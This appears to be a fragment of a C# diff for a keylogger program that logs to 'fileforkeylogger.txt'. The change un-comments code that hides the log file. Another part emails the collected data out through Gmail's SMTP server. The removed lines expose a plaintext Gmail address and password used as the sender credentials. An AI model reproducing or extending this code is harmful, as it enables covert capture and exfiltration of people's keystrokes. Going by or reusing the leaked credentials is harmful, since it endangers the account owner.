@@ -28,7 +28,7 @@ namespace No_4._1
 
                 String path = (filepath + @"\fileforkeylogger.txt");
 
-                //File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
+                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
 
                 if (!File.Exists(path))
                 {
@@ -86,12 +86,12 @@ namespace No_4._1
                 SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                 MailMessage mailMessage = new MailMessage();
 
-                mailMessage.From = new MailAddress("organton@gmail.com");
-                mailMessage.To.Add("organton@gmail.com");
+                mailMessage.From = new MailAddress("");
+                mailMessage.To.Add("");
                 mailMessage.Subject = subject;
                 client.UseDefaultCredentials = false;
                 client.EnableSsl = true;
-                client.Credentials = new System.Net.NetworkCredential("organton@gmail.com", "k1i2r3i4l5l6");
+                client.Credentials = new System.Net.NetworkCredential("", "");
                 mailMessage.Body = emailBody;
                 client.Send(mailMessage);
             }
